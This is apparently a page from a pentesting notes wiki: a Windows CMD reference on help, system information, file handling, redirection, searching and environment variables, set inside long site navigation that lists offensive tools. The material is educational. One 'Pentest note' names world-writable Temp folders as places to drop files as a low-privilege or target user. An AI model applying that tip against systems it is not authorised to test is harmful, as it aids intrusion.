+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_1" id="__nav_2_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Defense & Monitoring
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Defense & Monitoring
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Defense%20%26%20Monitoring/Sysmon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Status/In-Progress #Type/Tool #Context/Blueteam #Context/Windows #publish-me
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Defense%20%26%20Monitoring/iptables/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Iptables
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_2" id="__nav_2_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Enumeration/DNSenum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNSenum
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Enumeration/NetExec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NetExec
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Enumeration/ODAT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ODAT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Enumeration/enum4linux-ng/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enum4linux ng
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Enumeration/rdp-sec-check/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rdp sec check
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Enumeration/rpcclient/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rpcclient
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Enumeration/smtp-user-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Smtp user enum
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_3" id="__nav_2_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSINT & Recon
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OSINT & Recon
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/OSINT%20%26%20Recon/Shodan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shodan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/OSINT%20%26%20Recon/dig/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dig
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_4" id="__nav_2_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Post Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Post Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Post%20Exploitation/PEASS-ng/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PEASS ng
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Post%20Exploitation/evil-winrm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Evil winrm
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_5" id="__nav_2_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Utilities
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Utilities
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Utilities/Docker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Docker
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Utilities/Rsync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rsync
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Utilities/SQLplus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQLplus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Utilities/Telnet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Telnet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Utilities/curl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Curl
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Utilities/xfreerdp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Xfreerdp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_6" id="__nav_2_4_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Testing
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Testing
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Web%20Testing/WPScan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPScan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#terminology" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Terminology
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#core-concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Core Concepts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Core Concepts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#accessing-cmd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Accessing CMD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getting-help-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Getting Help &amp; History
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#system-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-system-navigation-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File System Navigation &amp; Management
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Environment Variables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-diagnostics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Diagnostics
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-privilege-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User &amp; Privilege Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share-network-resource-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Share &amp; Network Resource Management
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-permissions-icacls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Permissions — icacls
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#process-service-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Process &amp; Service Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-management-sc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Management — sc
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#registry-reg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Registry — reg
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scheduled-tasks-schtasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scheduled Tasks — schtasks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wmi-wmic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WMI — wmic
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-event-log" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Event Log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gui-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GUI Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-reference-workflows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick Reference Workflows
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#related-concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Related Concepts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#related-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Related Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#related-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Related Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references-images" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References / Images
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Windows Command Line</h1>
+
+<hr />
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p>Windows Command Line (CMD) provides core commands and utilities for interacting with the Windows OS, managing processes, retrieving system information, and performing network diagnostics. These commands are essential for administration, troubleshooting, and security investigation on Windows systems — and form the foundation for understanding the Windows environment before moving to PowerShell.</p>
+<hr />
+<h2 id="terminology">Terminology<a class="headerlink" href="#terminology" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CMD</td>
+<td>Windows Command Prompt; built-in command-line interpreter</td>
+</tr>
+<tr>
+<td>PID (Process ID)</td>
+<td>Unique number assigned to each running process</td>
+</tr>
+<tr>
+<td>Environment Variable</td>
+<td>System-wide variable storing configuration values (e.g., PATH)</td>
+</tr>
+<tr>
+<td>DLL (Dynamic Link Library)</td>
+<td>Shared library files loaded by processes at runtime</td>
+</tr>
+<tr>
+<td>Netstat</td>
+<td>Utility displaying active network connections and listening ports</td>
+</tr>
+<tr>
+<td>Flag</td>
+<td>Optional modifier appended to a command to change its behavior</td>
+</tr>
+<tr>
+<td>DACL</td>
+<td>Discretionary Access Control List; defines who can access an object and at what level</td>
+</tr>
+<tr>
+<td>SACL</td>
+<td>System Access Control List; logs access attempts to objects</td>
+</tr>
+<tr>
+<td>ACE</td>
+<td>Access Control Entry; individual rule within an ACL</td>
+</tr>
+<tr>
+<td>SID</td>
+<td>Security Identifier; unique ID assigned to user/group accounts</td>
+</tr>
+<tr>
+<td>SDDL</td>
+<td>Security Descriptor Definition Language; string format representing a security descriptor</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="core-concepts">Core Concepts<a class="headerlink" href="#core-concepts" title="Permanent link">&para;</a></h2>
+<h3 id="accessing-cmd">Accessing CMD<a class="headerlink" href="#accessing-cmd" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>Win + R</code> → type <code>cmd</code> → Enter</li>
+<li>Path: <code>C:\Windows\System32\cmd.exe</code></li>
+<li>Search "Command Prompt" in Start Menu</li>
+<li>Use <code>command /?</code> on any command to display help and available flags</li>
+</ul>
+<h3 id="getting-help-history">Getting Help &amp; History<a class="headerlink" href="#getting-help-history" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>help</code></td>
+<td>List all built-in CMD commands with brief descriptions</td>
+</tr>
+<tr>
+<td><code>help &lt;command&gt;</code></td>
+<td>Detailed help for a specific command</td>
+</tr>
+<tr>
+<td><code>&lt;command&gt; /?</code></td>
+<td>Alternative help flag used by some commands</td>
+</tr>
+<tr>
+<td><code>cls</code></td>
+<td>Clear the screen</td>
+</tr>
+<tr>
+<td><code>doskey /history</code></td>
+<td>Show all commands run in the current session</td>
+</tr>
+<tr>
+<td><code>F3</code></td>
+<td>Retype the entire previous command</td>
+</tr>
+<tr>
+<td><code>F5</code></td>
+<td>Cycle backward through command history</td>
+</tr>
+<tr>
+<td><code>F7</code></td>
+<td>Interactive scrollable history list</td>
+</tr>
+<tr>
+<td><code>F9</code></td>
+<td>Enter a command by its history number</td>
+</tr>
+<tr>
+<td><code>CTRL + C</code></td>
+<td>Interrupt and stop a running process</td>
+</tr>
+</tbody>
+</table>
+<p>Offline reference: <a href="https://ss64.com/nt/">https://ss64.com/nt/</a> — covers CMD, PowerShell, and Bash flags comprehensively.</p>
+<h3 id="system-information">System Information<a class="headerlink" href="#system-information" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ver</code></td>
+<td>Displays current Windows version</td>
+</tr>
+<tr>
+<td><code>systeminfo</code></td>
+<td>Detailed OS and hardware information</td>
+</tr>
+<tr>
+<td><code>driverquery</code></td>
+<td>Lists all installed drivers</td>
+</tr>
+<tr>
+<td><code>set</code></td>
+<td>Displays environment variables including PATH</td>
+</tr>
+</tbody>
+</table>
+<h3 id="file-system-navigation-management">File System Navigation &amp; Management<a class="headerlink" href="#file-system-navigation-management" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>dir</code></td>
+<td>Lists files and directories in current location</td>
+</tr>
+<tr>
+<td><code>dir /a</code></td>
+<td>Shows hidden and system files</td>
+</tr>
+<tr>
+<td><code>dir /s</code></td>
+<td>Recursive listing of all files and subdirectories</td>
+</tr>
+<tr>
+<td><code>dir /A:R *</code></td>
+<td>Find files with a specific attribute (R = read-only; H = hidden)</td>
+</tr>
+<tr>
+<td><code>cd &lt;path&gt;</code></td>
+<td>Change directory; without arguments prints the current path</td>
+</tr>
+<tr>
+<td><code>tree</code></td>
+<td>Visualizes directory structure hierarchically</td>
+</tr>
+<tr>
+<td><code>tree /F</code></td>
+<td>Visualizes directory tree including all files</td>
+</tr>
+<tr>
+<td><code>type &lt;filename&gt;</code></td>
+<td>Displays contents of a text file</td>
+</tr>
+<tr>
+<td><code>more &lt;filename&gt;</code></td>
+<td>Displays file contents one screen at a time; press Space to advance</td>
+</tr>
+<tr>
+<td><code>more /S &lt;filename&gt;</code></td>
+<td>Same as above but compresses consecutive blank lines</td>
+</tr>
+<tr>
+<td><code>copy &lt;source&gt; &lt;dest&gt;</code></td>
+<td>Copies a file to destination</td>
+</tr>
+<tr>
+<td><code>move &lt;source&gt; &lt;dest&gt;</code></td>
+<td>Moves a file to destination</td>
+</tr>
+<tr>
+<td><code>del &lt;filename&gt;</code></td>
+<td>Deletes a file</td>
+</tr>
+<tr>
+<td><code>erase &lt;filename&gt;</code></td>
+<td>Identical to <code>del</code>; alternative alias</td>
+</tr>
+<tr>
+<td><code>del /A:R &lt;filename&gt;</code></td>
+<td>Delete read-only files; <code>/A:H</code> targets hidden files</td>
+</tr>
+</tbody>
+</table>
+<p>Pentest note: <code>C:\Windows\Temp</code> is world-writable (all users have read/write/execute) — useful for dropping files as a low-privilege user. <code>C:\Users\&lt;user&gt;\AppData\Local\Temp</code> is fully owned by the target user account — useful when operating as that user.</p>
+<h4 id="creating-and-renaming-files">Creating and Renaming Files<a class="headerlink" href="#creating-and-renaming-files" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>md &lt;name&gt;</code></td>
+<td>Create a new directory (alias: <code>mkdir</code>)</td>
+</tr>
+<tr>
+<td><code>rd &lt;name&gt;</code></td>
+<td>Remove an empty directory (alias: <code>rmdir</code>)</td>
+</tr>
+<tr>
+<td><code>rd /S &lt;name&gt;</code></td>
+<td>Remove a directory and all contents recursively</td>
+</tr>
+<tr>
+<td><code>ren &lt;old&gt; &lt;new&gt;</code></td>
+<td>Rename a file or directory (alias: <code>rename</code>)</td>
+</tr>
+<tr>
+<td><code>echo &lt;text&gt; &gt; &lt;file&gt;</code></td>
+<td>Write text to a file (overwrites existing)</td>
+</tr>
+<tr>
+<td><code>echo &lt;text&gt; &gt;&gt; &lt;file&gt;</code></td>
+<td>Append text to a file</td>
+</tr>
+<tr>
+<td><code>fsutil file createNew &lt;file&gt; &lt;bytes&gt;</code></td>
+<td>Create a file of a specific size in bytes</td>
+</tr>
+</tbody>
+</table>
+<h4 id="copying-and-moving-files">Copying and Moving Files<a class="headerlink" href="#copying-and-moving-files" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>xcopy &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Extended copy; handles directories and can strip read-only attributes</td>
+</tr>
+<tr>
+<td><code>xcopy /E &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Copy all subdirectories including empty ones; resets file attributes</td>
+</tr>
+<tr>
+<td><code>xcopy /K &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Retain original file attributes (read-only, hidden) during copy</td>
+</tr>
+<tr>
+<td><code>robocopy &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Successor to xcopy; designed for large directories and network drive sync</td>
+</tr>
+<tr>
+<td><code>robocopy /E &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Copy all subdirectories including empty ones</td>
+</tr>
+<tr>
+<td><code>robocopy /MIR &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Mirror source to destination; removes destination files not in source</td>
+</tr>
+<tr>
+<td><code>robocopy /A-:SH &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Remove System and Hidden attributes from copied files</td>
+</tr>
+<tr>
+<td><code>robocopy /L &lt;src&gt; &lt;dest&gt;</code></td>
+<td>Dry run — show what would happen without executing</td>
+</tr>
+</tbody>
+</table>
+<p>Note: robocopy with <code>/MIR</code> marks files as system backup — use <code>/A-:SH</code> to strip those attributes afterward if needed. Requires <code>SeBackupPrivilege</code> for some system files.</p>
+<h4 id="file-redirection-operators">File Redirection Operators<a class="headerlink" href="#file-redirection-operators" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&gt;</code></td>
+<td>Redirect output to a file (overwrites)</td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code></td>
+<td>Append output to a file</td>
+</tr>
+<tr>
+<td><code>\|</code></td>
+<td>Pipe output of one command as input to another</td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td>Use a file's contents as input to a command</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>Run two commands regardless of whether the first succeeds</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>Run the second command only if the first succeeds</td>
+</tr>
+<tr>
+<td><code>\|\|</code></td>
+<td>Run the second command only if the first fails</td>
+</tr>
+</tbody>
+</table>
+<h4 id="finding-files-and-text">Finding Files and Text<a class="headerlink" href="#finding-files-and-text" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>where &lt;name&gt;</code></td>
+<td>Search PATH environment variable for an executable or file</td>
+</tr>
+<tr>
+<td><code>where /R &lt;path&gt; &lt;name&gt;</code></td>
+<td>Recursively search from a starting path</td>
+</tr>
+<tr>
+<td><code>find "text" &lt;file&gt;</code></td>
+<td>Search for a literal text string inside a file</td>
+</tr>
+<tr>
+<td><code>find /V "text" &lt;file&gt;</code></td>
+<td>Find lines that do NOT contain the text</td>
+</tr>
+<tr>
+<td><code>find /N "text" &lt;file&gt;</code></td>
+<td>Show matching lines with line numbers</td>
+</tr>
+<tr>
+<td><code>find /I "text" &lt;file&gt;</code></td>
+<td>Case-insensitive search</td>
+</tr>
+<tr>
+<td><code>findstr &lt;pattern&gt; &lt;file&gt;</code></td>
+<td>Regex-based search — closer to <code>grep</code>; supports multiple patterns</td>
+</tr>
+<tr>
+<td><code>comp &lt;file1&gt; &lt;file2&gt;</code></td>
+<td>Compare two files byte-by-byte (default: decimal format)</td>
+</tr>
+<tr>
+<td><code>comp /A &lt;file1&gt; &lt;file2&gt;</code></td>
+<td>Compare in ASCII format</td>
+</tr>
+<tr>
+<td><code>fc &lt;file1&gt; &lt;file2&gt;</code></td>
+<td>Show which lines differ between two files (more readable than comp)</td>
+</tr>
+<tr>
+<td><code>fc /N &lt;file1&gt; &lt;file2&gt;</code></td>
+<td>File compare with line numbers shown</td>
+</tr>
+<tr>
+<td><code>sort &lt;file&gt;</code></td>
+<td>Sort lines of a file; can receive input from pipe</td>
+</tr>
+<tr>
+<td><code>sort /O &lt;out&gt; &lt;file&gt;</code></td>
+<td>Write sorted results to a different file</td>
+</tr>
+<tr>
+<td><code>sort /unique &lt;file&gt;</code></td>
+<td>Output only unique lines</td>
+</tr>
+<tr>
+<td><code>openfiles</code></td>
+<td>Show files currently open on the local or remote host and which user has them open; requires admin and must be enabled first with <code>openfiles /local on</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="environment-variables">Environment Variables<a class="headerlink" href="#environment-variables" title="Permanent link">&para;</a></h3>
+<p>Environment variables store configuration values accessible to the OS and applications. On Windows they are case-insensitive and can contain spaces and numbers, but cannot start with a number or contain an equals sign. Reference a variable with <code>%VARIABLE_NAME%</code>.</p>
